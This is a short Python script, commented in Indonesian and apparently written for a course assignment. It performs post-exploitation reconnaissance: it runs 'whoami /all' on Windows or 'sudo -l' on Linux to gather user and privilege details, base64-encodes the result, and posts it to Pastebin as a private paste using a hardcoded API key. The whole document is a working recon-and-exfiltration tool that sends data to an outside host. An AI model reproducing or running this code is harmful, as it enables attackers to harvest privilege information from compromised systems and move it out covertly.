import sys
import base64
from subprocess import PIPE, Popen
from requests.api import post
from platform import system

#api pastebin
pastebin_api_key = 'm7cW-fd8231LVxwQjuoxiPYwcwzxyYtR'
# url untuk upload paste
pastebin_paste_url = 'https://pastebin.com/api/api_post.php'

message = 'Recon Result: \n'

# untuk memproses informasi berupa hostname, info user, privilege
if system() == 'Windows':
    process = Popen('whoami /all', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = process.communicate()

elif system() == 'Linux':
    process = Popen('sudo -l', stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
    result, err = process.communicate()

# untuk memasukkan informasi berupa hostname, info user, privilege ke dalam pesan
if result == b'':
    message += err.decode()

else:
    message += result.decode()

# encoding pesan dengan menggunakan base64
paste_messages = base64.b64encode(message.encode())
print(paste_messages)

# mengirim request dengan menggunakan api pastebin
post_data = {
    'api_dev_key': pastebin_api_key,
    'api_option': 'paste',
    'api_paste_code': paste_messages,
    'api_paste_name': 'tugas_forum_pastebin',
    'api_paste_private': 1
}
# mengirim paste dengan cara post
r = post(url=pastebin_paste_url, data=post_data)

# jika status code berhasil maka diprint link untuk pastebinnya
if r.status_code != 200:
    print(f'{r.text}')
else:
    print(f'{r.text}')